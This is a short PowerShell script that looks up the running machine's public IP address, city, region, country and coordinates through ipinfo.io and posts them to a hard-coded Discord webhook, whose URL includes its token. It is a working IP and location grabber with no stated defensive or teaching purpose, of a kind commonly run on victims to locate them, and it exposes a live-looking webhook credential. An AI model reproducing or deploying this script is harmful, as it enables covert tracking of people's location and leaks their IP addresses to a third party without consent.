# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1307484158192390165/Fj0EjVersk-B9aqImHM-ZvVeF3UNvRIUavceJVJmx2uxCO2qJTV4kB93vJj8jBPheAVt"

# Get location data using ipinfo.io
try {
    $locationData = Invoke-RestMethod -Uri "https://ipinfo.io/json"
} catch {
    Write-Host "Error retrieving location data:" $_.Exception.Message
    exit
}

# Validate location data
if (-not $locationData) {
    Write-Host "Location data is empty. Exiting."
    exit
}

# Extract information
$ip = $locationData.ip
$city = $locationData.city
$region = $locationData.region
$country = $locationData.country
$coordinates = $locationData.loc

# Debugging: Print the extracted information
Write-Host "IP: $ip"
Write-Host "City: $city"
Write-Host "Region: $region"
Write-Host "Country: $country"
Write-Host "Coordinates: $coordinates"

# Ensure extracted data is not empty
if (-not $ip -or -not $city -or -not $region -or -not $country -or -not $coordinates) {
    Write-Host "One or more required fields are missing. Exiting."
    exit
}

# Format the message
$message = "IP: $ip`nCity: $city`nRegion: $region`nCountry: $country`nCoordinates: $coordinates"
Write-Host "Formatted message: $message"

# Send the message to Discord webhook
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message} | ConvertTo-Json -Depth 1) -ContentType "application/json"
    Write-Host "Message sent successfully!"
} catch {
    Write-Host "Error sending message to Discord webhook:" $_.Exception.Message
}
